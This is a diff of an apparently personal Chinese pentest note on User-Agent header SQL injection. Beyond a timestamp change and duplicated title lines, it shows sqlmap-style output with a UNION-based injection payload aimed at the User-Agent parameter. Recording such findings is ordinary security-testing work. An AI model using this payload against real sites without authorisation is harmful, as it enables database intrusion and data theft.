@@ -3,7 +3,7 @@ title: UA注入
 date: 2024-11-23T23:07:37Z
 lastmod: 2024-11-24T00:02:15Z
 created: 2024-11-27T22:18
-updated: 2024-12-14T19:10
+updated: 2024-12-14T19:12
 ---
 
 # UA注入
@@ -50,6 +50,8 @@ Parameter: User-Agent (User-Agent)
     Title: Generic UNION query (random number) - 2 columns
     Payload: -3044 UNION ALL SELECT CONCAT(0x717a787671,0x436c6f7263544a7473717063674f6742757550596162746662686b566368784f6d79775567594974,0x7170707671),3573-- -
 tags: [web渗透]
+title: UA注入
+title: UA注入
 ---
 ```
 
